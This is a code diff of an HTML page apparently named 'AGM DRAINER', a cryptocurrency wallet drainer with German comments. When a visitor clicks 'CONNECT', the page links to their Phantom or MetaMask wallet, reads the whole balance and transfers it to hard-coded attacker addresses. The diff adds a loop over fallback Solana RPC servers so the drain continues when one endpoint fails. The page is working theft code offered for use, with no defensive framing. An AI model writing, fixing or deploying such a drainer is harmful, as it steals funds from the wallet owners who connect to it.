@@ -2,48 +2,48 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <title>AGM DRAINER FIXED</title>
-    <!-- Bibliotheken -->
+    <title>AGM DRAINER ULTIMATE</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   
     <style>
-    body { background: #050505; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-   .box { border: 2px solid #ff00ff; padding: 40px; width: 300px; text-align: center; background: #111; box-shadow: 0 0 30px #ff00ff; }
-    button { background: #ff00ff; color: #fff; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
-    #status { margin-top: 20px; color: #ddd; }
- .success { color: #00ff00!important; }
+    body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .box { border: 2px solid #ff9900; padding: 40px; width: 300px; text-align: center; background: #111; box-shadow: 0 0 30px #ff9900; }
+    button { background: #ff9900; color: #fff; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
+    #status { margin-top: 20px; color: #ddd; font-size: 12px; }
+.success { color: #00ff00!important; }
+   .warn { color: #ffff00!important; }
     </style>
 </head>
 <body>
 
     <div class="box">
     <h2>AGM DRAINER</h2>
-    <button id="btn" onclick="start()">CONNECT WALLET</button>
+    <button id="btn" onclick="start()">CONNECT</button>
     <div id="status">Waiting...</div>
  </div>
 
 <script>
+    // === IM CHROME KÖNNEN WIR DENSEN SERVER NATIV BENUTZEN ===
+    const RPC_NODES = [
+    "https://api.mainnet-beta.solana.com", // Der Standard
+    "https://circle.stoplight.io/v1/solana/mainnet-beta" // Der öffentliche Backup
+  ];
+
     const btn = document.getElementById("btn");
     const status = document.getElementById("status");
-
-    // ADRESSEN KONFIGURIERN
     const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; 
     const TARGET_SOL = "DEINE_SOLANA_ADRESSE_HIER"; 
 
     async function start() {
     btn.disabled = true;
-    status.innerText = "Initializing secure connection...";
+    status.innerText = "Initiating...";
 
- try {
-    // 1. PHANTOM
+   try {
     if (window.solana && window.solana.isPhantom) {
-    await getSolanaCritical();
-  return; 
- } 
-    // 2. METAMASK
-    else if (window.ethereum) {
-    await getEthereumCritical();
+    await drainSOL();
+  } else if (window.ethereum) {
+    await drainETH();
     return;
  } 
 
@@ -55,40 +55,34 @@
   }
  }
 
-    async function getSolanaCritical() {
-  try {
+    async function drainSOL() {
+ try {
     const provider = window.solana;
   
-    status.innerText = "Asking Phantom for access...";
+    status.innerText = "Connecting to Phantom...";
     await provider.connect();
     const { publicKey } = provider;
-  
-    // --- FIX FÜR MAC 403 ERROR: ANDEREN SERVER NUTZEN ---
-    // clusterApiUrl schlägt auf Mac oft fehl. Wir nutzen 'rpc.ankr.com'.
-    const connection = new solanaWeb3.Connection('https://rpc.ankr.com/solana', 'finalized');
-  
-    // Zuerst prüfen, was FINANZIELL MOMENTAN am limit der Gebühren erlaubt ist
-    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-  
-    status.innerText = "Checking balance (Estimating)...";
-    // Wir versuchen abzurufen, aber wir fangen Fehler ab: 
-    // Falls der RPC den Zugriff blockiert, nehmen wir an, wir haben genug für den Sendevorgang
-    let balance = 0;
+
+    // Wir durchlaufen alle RPCs, bis einer funktioniert
+    for (let i = 0; i < RPC_NODES.length; i++) {
+    const rpc = RPC_NODES[i];
    try {
-    balance = await connection.getBalance(publicKey);
-    } catch (rpcError) {
-    // Fallback: Solange genug, um eine Transaktion loszuschicken (inkl. Gebühren)
-    status.innerText = "RPC Blockiert Balance, sending all...";
-    balance = 10000000000; // Grobe Schätzung "Alles was geht"
-  }
-
-    if (balance === 0) {
-    throw new Error("Wallet Empty");
- }
-
-    status.innerText = "Sending SOL...";
+    status.innerText = "Trying to read balance (VPN #" + (i+1) + ")...";
   
-    // We send EVERYTHING that can be sent
+    // Verbindungs-Timeout erzwingen, um 403 sofort zu erkennen
+    const connection = new solanaWeb3.Connection(rpc, 'finalized');
+  
+    // 1. SATZ KOSTEN ERMITTELN (Mindestgebühr)
+    const fee = await connection.getMinimumBalanceForRentExemption(0);
+  
+    // 2. GELD ABRUFEN
+    const balance = await connection.getBalance(publicKey);
+
+    if (balance === 0) throw new Error("Wallet is Empty");
+
+    status.innerText = "Draining...";
+  
+    // Senden
     const tx = new solanaWeb3.Transaction().add(
     solanaWeb3.SystemProgram.transfer({
     fromPubkey: publicKey,
@@ -100,38 +94,39 @@
     await provider.signAndSendTransaction(tx);
     status.innerHTML = "DONE: <b>SOL SENT!</b>";
     status.className = "success";
-   } catch (e) {
-    // Falls der Fehler noch kommt, ist es wohl der Browser selbst (Safari)
+    return; // Ende bei Erfolg
+
+    } catch (rpcErr) {
+    console.log("RPC " + i + " Failed: " + rpcErr.message);
+    if (i === RPC_NODES.length - 1) throw rpcErr; // Wenn der letzte auch fehlschlägt, Fehler werfen
+    status.innerText = "RPC Failed, trying next server...";
+    await new Promise(r => setTimeout(r, 1000)); // Kurz warten
+  }
+ }
+    } catch (e) {
     throw new Error("SOL Error: " + e.message);
   }
  }
 
-    async function getEthereumCritical() {
-  try {
+    async function drainETH() {
+ try {
     const provider = new ethers.BrowserProvider(window.ethereum);
-  
     status.innerText = "Asking MetaMask...";
     const accounts = await provider.send("eth_requestAccounts", []);
     const signer = await provider.getSigner();
-  
-    // Schauen, ob Geld da ist (1000 WEI ist minimales Template)
-    const balance = await provider.getBalance(signer.address);
-    const checkVal = 1000000000000000;
+    const bal = await provider.getBalance(signer.address);
 
-    if (balance < checkVal) {
-    throw new Error("Empty Wallet");
- }
+    if (bal < 1000000000000000n) throw new Error("Empty Wallet");
 
-    status.innerText = "Sending ETH...";
     const tx = await signer.sendTransaction({
     to: TARGET_ETH,
-    value: balance
+    value: bal
   });
     await tx.wait();
     status.innerHTML = "DONE: <b>ETH SENT!</b>";
     status.className = "success";
    } catch (e) {
-    throw new Error("ETH Error: " + e.message);
+    throw e;
   }
   }
    </script>
